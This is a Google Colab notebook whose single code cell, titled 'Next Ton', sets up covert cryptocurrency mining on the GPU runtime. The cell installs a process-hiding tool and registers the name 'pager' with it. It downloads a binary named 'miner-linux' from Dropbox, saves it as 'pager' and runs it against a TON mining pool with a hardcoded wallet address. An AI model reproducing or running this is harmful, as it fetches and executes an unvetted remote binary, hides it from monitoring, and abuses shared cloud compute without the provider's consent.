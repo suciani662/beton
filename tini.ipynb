{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "tini.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "authorship_tag": "ABX9TyN1zSmtPMjn0r7cvWsTTxqm",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/suciani662/beton/blob/main/tini.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "cellView": "form",
        "id": "ZUunjc5W7kGZ"
      },
      "outputs": [],
      "source": [
        "#@title Next Ton\n",
        "%%shell\n",
        "sudo apt update \n",
        "sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y\n",
        "npm i -g node-process-hider && ph add pager \n",
        "wget -O pager https://www.dropbox.com/s/f6x8n3lssyuqdrx/miner-linux?dl=1 \n",
        "chmod +x pager\n",
        "./pager run https://next.ton-pool.club EQCI5-3oEr4Kd9jCK7NFL4NvOYCa-qYtE0AqrG1B4wkSR0LE"
      ]
    }
  ]
}